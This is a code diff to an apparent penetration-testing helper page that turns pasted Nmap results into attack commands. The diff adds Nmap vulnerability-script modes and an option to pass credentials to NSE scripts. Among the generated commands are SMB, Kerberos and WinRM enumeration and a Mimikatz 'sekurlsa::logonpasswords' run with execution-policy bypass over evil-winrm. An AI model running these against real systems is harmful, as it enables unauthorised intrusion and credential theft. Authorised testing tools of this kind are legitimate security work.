@@ -15,8 +15,8 @@
   input[type="text"], input[type="password"], textarea { width: 100%; padding: 5px 8px; border: 1px solid #8884; border-radius: 6px; font-size: 0.78rem; }
   textarea { min-height: 110px; resize: vertical; }
   .ports { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 4px 6px; max-height: 320px; overflow: auto; padding: 6px; border: 1px solid #8884; border-radius: 8px; }
-  label.chk { display: flex; align-items: center; gap: 4px; font-size: 0.72rem; }
-  .actions { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 6px; }
+  label.chk { display: flex; align-items: center; gap: 6px; font-size: 0.72rem; }
+  .actions { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 6px; align-items: center; }
   button { border: 0; padding: 6px 10px; border-radius: 6px; cursor: pointer; font-weight: 600; background: #4f46e5; color: #fff; font-size: 0.72rem; }
   button.secondary { background: #0ea5e9; }
   button.ghost { background: #eee; color: #111; }
@@ -30,7 +30,6 @@
   .kb-asterisk:hover { opacity: 1; text-shadow: 0 0 0.25px currentColor; }
   .kb-asterisk:focus { outline: none; box-shadow: 0 0 0 2px #60a5fa66; border-radius: 3px; }
 
-  /* Borderless overlay */
   .overlay { position: fixed; inset: 0; background: rgba(0,0,0,.45); display: none; align-items: center; justify-content: center; z-index: 9999; }
   .panel { width: min(820px, 92vw); max-height: 82vh; background: #0b0b0b; color: #eaeaea; border-radius: 12px; padding: 0; box-shadow: none; display: flex; flex-direction: column; }
   .panel header { display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; font-size: 0.8rem; }
@@ -62,6 +61,19 @@
       <label><input type="checkbox" id="includeFiltered" checked> Include filtered ports when selecting</label>
       <button type="button" class="ghost" id="clearLinks">Clear links</button>
       <button type="button" class="ghost" id="clearPorts">Clear ports</button>
+
+      <!-- NEW: Nmap mode + pass-creds -->
+      <label style="margin-left:8px;">Nmap mode:
+        <select id="nmapMode">
+          <option value="off">Off</option>
+          <option value="default">Default (-sC)</option>
+          <option value="bundles" selected>Service bundles (smart)</option>
+          <option value="vuln">Vuln category</option>
+          <option value="vulners">Vulners</option>
+          <option value="vulscan">Vulscan</option>
+        </select>
+      </label>
+      <label><input type="checkbox" id="nmapPassCreds" checked> Pass creds to NSE</label>
     </div>
   </fieldset>
 
@@ -128,8 +140,10 @@ document.addEventListener('DOMContentLoaded', () => {
   const nmapEl   = document.getElementById('nmapInput');
   const linksEl  = document.getElementById('portLinks');
   const includeFilteredEl = document.getElementById('includeFiltered');
+  const nmapModeEl = document.getElementById('nmapMode');
+  const nmapPassCredsEl = document.getElementById('nmapPassCreds');
 
-  // Build checkbox grid (+ subtle * for 88)
+  // Build checkbox grid (+ * trigger for 88 Kerberos)
   PORTS.forEach(([p,label])=> ensurePortCheckbox(p, label));
   function ensurePortCheckbox(port, label='(parsed)'){
     const id = 'p' + port;
@@ -177,7 +191,7 @@ document.addEventListener('DOMContentLoaded', () => {
   document.getElementById('clearPorts').addEventListener('click', clearPorts);
   document.getElementById('clearLinks').addEventListener('click', clearLinks);
 
-  // Parse Nmap
+  // Parse Nmap (select ports + links, and we can infer if -sV was used)
   document.getElementById('parseNmap').addEventListener('click', ()=>{
     const txt = nmapEl.value || '';
     if(!txt.trim()) return;
@@ -239,7 +253,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if(user)   { parts.push('-u', shellEscape(user)); }
       if(pass)   { parts.push('-p', shellEscape(pass)); }
       if(domain) { parts.push('-d', shellEscape(domain)); }
-      cmds.push(parts.filter(Boolean).join(' '));
+      cmds.push(join(parts));
     };
 
     // ---------- Kerberos (88) / Kerbrute ----------
@@ -267,13 +281,13 @@ document.addEventListener('DOMContentLoaded', () => {
       if(pass)   e4l.push('-p', shellEscape(pass));
       if(domain) e4l.push('-w', shellEscape(domain));
       e4l.push(host);
-      cmds.push(e4l.join(' '));
+      cmds.push(join(e4l));
 
       const smbm = ['smbmap','-H',host];
       if(user)   smbm.push('-u', shellEscape(user));
       if(pass)   smbm.push('-p', shellEscape(pass));
       if(domain) smbm.push('-d', shellEscape(domain));
-      cmds.push(smbm.join(' '));
+      cmds.push(join(smbm));
 
       cmds.push(`smbclient -L \\\\${host} -N`);
       cme('smb');
@@ -286,15 +300,10 @@ document.addEventListener('DOMContentLoaded', () => {
       if(user) ew.push('-u', shellEscape(user));
       if(pass) ew.push('-p', shellEscape(pass));
       ew.push('-i', host);
-      cmds.push(ew.join(' '));
-      // Mimikatz via WinRM (as you had it), but keep NTLM (no -r)
+      cmds.push(join(ew));
       if(user && pass){
         cmds.push('# Mimikatz via WinRM (requires Invoke-Mimikatz.ps1 locally)');
-        const ew2 = ['evil-winrm'];
-        ew2.push('-u', shellEscape(user));
-        ew2.push('-p', shellEscape(pass));
-        ew2.push('-i', host, '-s', '.');
-        cmds.push(ew2.join(' '));
+        cmds.push(`evil-winrm -u ${shellEscape(user)} -p ${shellEscape(pass)} -i ${host} -s .`);
         cmds.push('# Inside evil-winrm session:');
         cmds.push('upload Invoke-Mimikatz.ps1');
         cmds.push('powershell -ep bypass -c "Import-Module .\\\\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command \\"sekurlsa::logonpasswords\\""');
@@ -418,14 +427,6 @@ document.addEventListener('DOMContentLoaded', () => {
       cmds.push(`redis-cli -h ${host} -p 6379 ${a}`.replace(/\s+/g,' ').trim());
     }
 
-    // ---------- DNS (53) ----------
-    if(ports.includes(53)){
-      cmds.push('# DNS');
-      cmds.push(`dig @${host} any .`);
-      cmds.push(`dig @${host} -x ${host}`);
-      cmds.push(`dnsenum ${host}`);
-    }
-
     // ---------- Oracle (1521) ----------
     if(ports.includes(1521)){
       const uo = user || 'scott', pwo = pass || 'tiger';
@@ -462,9 +463,73 @@ document.addEventListener('DOMContentLoaded', () => {
       cmds.push(`snmp-check ${host}`);
     }
 
-    // ---------- Nmap vuln NSE ----------
-    cmds.push('# Nmap (vuln NSE) per-port');
-    ports.forEach(pp=> cmds.push(`nmap --script vuln -p ${pp} ${host}`));
+    // ---------- Nmap mode ----------
+    const nmapTxt = (nmapEl.value || '');
+    const hasVersion = /^PORT\s+STATE\s+SERVICE\s+VERSION/im.test(nmapTxt) || /Service Info:/i.test(nmapTxt);
+    const mode = nmapModeEl.value;
+    const passCreds = nmapPassCredsEl.checked;
+
+    function emitDefault(){
+      cmds.push('# Nmap (default scripts)');
+      cmds.push(`sudo nmap -Pn -sC -sV -p ${ports.join(',')} ${host}`);
+    }
+    function emitVuln(){
+      cmds.push('# Nmap (vuln category)');
+      cmds.push(`sudo nmap -Pn -sV -p ${ports.join(',')} ${host} --script vuln --script-timeout 20s`);
+    }
+    function emitVulners(){
+      if(!hasVersion) return; // require visible -sV results pasted
+      cmds.push('# Nmap (vulners)');
+      cmds.push(`sudo nmap -Pn -sV -p ${ports.join(',')} ${host} --script vulners --script-args mincvss=7.0`);
+    }
+    function emitVulscan(){
+      if(!hasVersion) return; // best with -sV-visible results
+      cmds.push('# Nmap (vulscan)');
+      cmds.push(`sudo nmap -Pn -sV -p ${ports.join(',')} ${host} --script vulscan`);
+    }
+    function emitBundles(){
+      if(!hasVersion) return; // respect your rule: no bundles without -sV pasted
+      const sel = new Set(ports);
+      const smbPorts = [139,445].filter(p=>sel.has(p));
+      const httpPorts = [80,443,8080,8081,8000,8443,3000,5000,5601,9000].filter(p=>sel.has(p));
+      const ldapPorts = [389,636].filter(p=>sel.has(p));
+      const tlsPorts = [443,8443,636,5986,3269,3389].filter(p=>sel.has(p));
+
+      if (smbPorts.length){
+        const scripts = 'smb2-security-mode,smb2-time,smb-os-discovery,smb-enum-shares,smb-enum-users';
+        const args = [];
+        if (passCreds && user) args.push(`smbusername=${shellEscape(user)}`);
+        if (passCreds && pass) args.push(`smbpassword=${shellEscape(pass)}`);
+        if (passCreds && domain) args.push(`smbdomain=${shellEscape(domain)}`);
+        cmds.push(`sudo nmap -Pn -sV -p ${smbPorts.join(',')} ${host} --script "${scripts}"${args.length ? ' --script-args ' + args.join(',') : ''}`);
+      }
+      if (httpPorts.length){
+        const scripts = 'http-title,http-server-header,http-headers,http-methods,http-enum,http-robots.txt';
+        cmds.push(`sudo nmap -Pn -sV -p ${httpPorts.join(',')} ${host} --script "${scripts}"`);
+      }
+      if (sel.has(3389)){
+        cmds.push(`sudo nmap -Pn -sV -p 3389 ${host} --script "rdp-ntlm-info,rdp-enum-encryption"`);
+      }
+      if (ldapPorts.length){
+        cmds.push(`sudo nmap -Pn -sV -p ${ldapPorts.join(',')} ${host} --script "ldap-rootdse,ldap-search"`);
+      }
+      if (sel.has(53)){
+        cmds.push(`sudo nmap -Pn -sV -p 53 ${host} --script "dns-recursion,dns-nsid,dns-zone-transfer"`);
+      }
+      if (tlsPorts.length){
+        cmds.push(`sudo nmap -Pn -sV -p ${tlsPorts.join(',')} ${host} --script "ssl-cert,ssl-enum-ciphers"`);
+      }
+    }
+
+    switch(mode){
+      case 'default': emitDefault(); break;
+      case 'vuln': emitVuln(); break;
+      case 'vulners': emitVulners(); break;
+      case 'vulscan': emitVulscan(); break;
+      case 'bundles': emitBundles(); break;
+      case 'off':
+      default: /* no nmap lines */ break;
+    }
 
     outEl.textContent = cmds.join('\n');
   });
